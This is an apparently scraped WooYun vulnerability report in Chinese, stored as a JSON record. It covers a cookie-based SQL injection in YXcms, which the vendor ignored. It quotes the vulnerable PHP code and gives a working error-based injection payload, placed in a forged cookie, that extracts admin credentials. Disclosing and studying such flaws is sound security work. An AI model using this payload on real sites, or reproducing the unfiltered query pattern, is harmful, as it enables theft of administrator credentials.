{"id": 53000, "wybug_id": "wooyun-2014-069267", "wybug_title": "YXcms的cookie注入", "wybug_corp": "yxcms.net", "wybug_author": "zxx", "wybug_date": "2014-07-22 11:03", "wybug_open_date": "2014-10-17 11:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "注射漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-27：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-17：\t细节向公众公开  简要描述： 程序对注入过滤不严格，可以进行cookie注入。 详细说明：  前一篇中说到，我们可以绕过cookie验证，伪造登录，可是登录之后我们能做什么呢，权限太小了，找个注入玩玩吧。PowerCheck函数用于验证登录权限。\nProtected/apps/members/meberApi.php  public function powerCheck(){//参数一：返回1没有权限，返回2为登陆有权限，返回数组登陆有权限\t\t $cookie_auth=get_cookie('auth');//验证的时候从cookie中获取信息，拿我们看get_cookie函数     if(empty($cookie_auth)) $group_id=1;//未登录组     else{        $memberinfo=explode('\\t',$cookie_auth);         $auth['id']=$memberinfo[0];        $auth['groupid']=$memberinfo[1];        $auth['account']=$memberinfo[2];        $auth['nickname']=empty($memberinfo[3])?'未知':$memberinfo[3];        $auth['lastip']=$memberinfo[4];        $auth['headpic']=$memberinfo[5];        $group_id=$auth['groupid'];     }      $notallow=model('memberGroup')->find(\"id={$group_id}\");//这里是重点，将$group_id直接带进去查询，而这个$group_id是从cookie里取得的，我们直接伪造cookie，进行注入。      if(empty($notallow['notallow'])) return $group_id==1?array(2,$group_id):array($auth,$group_id);      else{        $flog=2;        $rules=explode('|',$notallow['notallow']);        foreach ($rules as $rule) {          $power=explode(',',$rule);          //R匹配          $reds=explode('/',$power[0]);          if(!empty($reds[0]) && $reds[0]==APP_NAME) $flog=1;          if(!empty($reds[1]) && 1==$flog && $reds[1]!=CONTROLLER_NAME) $flog=2;          if(!empty($reds[2]) && 1==$flog && $reds[2]!=ACTION_NAME) $flog=2;          //参数匹配判断          if(!empty($power[1]) && 1==$flog){            $items=explode('/',$power[1]);            if(!empty($items)){              foreach ($items as $value) {                 $gets=explode('=',$value);                 if(!empty($gets[1]) && 1==$flog && $_GET[$gets[0]]!=$gets[1]) $flog=2;              }            }          }          if(1==$flog) return array($flog,$group_id);        }        return $group_id==1?array(2,$group_id):array($auth,$group_id);      }  }\n   漏洞证明：  加密前cookie为：31\\t2 and (select 1 from (select count(*),concat((select concat(username,0x5f,password) from yx_admin limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a)#\\tzzz333\\tzzz333\\t221.196.57.31\\t\n\n   修复方案：  前一篇提到对cookie进行验证，另外从cookie中取出来group_id过滤一下吧。   版权声明：转载请注明来源 zxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-17 11:04 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}